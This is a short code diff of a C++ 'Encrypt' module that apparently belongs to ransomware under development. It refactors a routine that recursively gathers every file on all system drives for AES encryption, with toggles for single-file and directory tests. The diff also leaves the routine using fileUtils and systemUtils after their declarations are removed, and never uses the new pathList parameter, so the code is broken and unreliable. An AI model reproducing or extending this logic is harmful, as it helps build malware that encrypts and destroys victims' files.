@@ -5,9 +5,8 @@
 #include <vector>
 #include <iostream>
 #include "encryptor.h"
-#include "../utils/CryptoAes128.h"
-#include "../utils/SystemUtils.h"
-#include "../utils/FileUtils.h"
+#include "../Cryptography/AES128.h"
+#include "../FileScanner/FileUtils.h"
 #include "../../include/global.h"
 
 void Encrypt::createSaveFile() {
@@ -34,22 +33,17 @@ void Encrypt::printPathList(std::vector<fs::path> &file_list) {
   }
 }
 
-void Encrypt::startEncryptionProcess() {
-  FileUtils fileUtils;
-  CryptoAes128 cryptoAes128;
-  SystemUtils systemUtils;
-  createSaveFile();
-
-
+void Encrypt::startEncryptionProcess(std::vector<fs::path> &pathList) {
+  AES128 aes128;
 
   std::vector<fs::path> file_list;
   if (SINGLE_FILE_TEST) {
     std::cout << TEST_FILE_PATH << std::endl;
     file_list = {TEST_FILE_PATH};  // bleibt fs::path
   } else if (DIRECTORY_TEST) {
-    file_list = fileUtils.listFiles({TEST_DIRECTORY}, true);
+    file_list = fileUtils.scanPathForFiles({TEST_DIRECTORY}, true);
   } else {
-    file_list = fileUtils.listFiles(systemUtils.getAllDrives(), true);
+    file_list = fileUtils.scanPathForFiles(systemUtils.getAllDrives(), true);
   }
 
   size_t pathAmount = file_list.size();
